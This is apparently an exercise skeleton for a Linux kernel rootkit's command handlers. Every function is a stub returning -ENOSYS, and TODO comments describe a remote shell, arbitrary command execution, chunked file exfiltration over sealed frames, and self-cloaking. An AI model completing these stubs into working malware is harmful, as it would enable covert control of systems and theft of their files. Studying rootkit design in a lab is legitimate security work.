// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "rootkit.h"

/*
 * TODO: Implement cmd_ping.
 * Send "PONG" via rk_send_response.
 */
int cmd_ping(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_status.
 * Send "OK" via rk_send_response.
 */
int cmd_status(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_info.
 * Send "INFO OK" via rk_send_response.
 */
int cmd_info(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_shell.
 * Call rk_start_interactive, send "SHELL OK".
 */
int cmd_shell(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_exec.
 * Validate arg is present, call rk_start_exec(arg), send "EXEC OK".
 */
int cmd_exec(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_download.
 *
 * 1. filp_open the path from arg.
 * 2. kernel_read in RK_CHUNK_SIZE loops.
 * 3. rk_send_sealed each chunk.
 * 4. Send a zero-length sealed frame at EOF.
 * 5. kfree buffer, filp_close.
 */
int cmd_download(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_cloak, cmd_uncloak.
 * Call rk_cloak/rk_uncloak, send response.
 */
int cmd_cloak(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_uncloak(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}
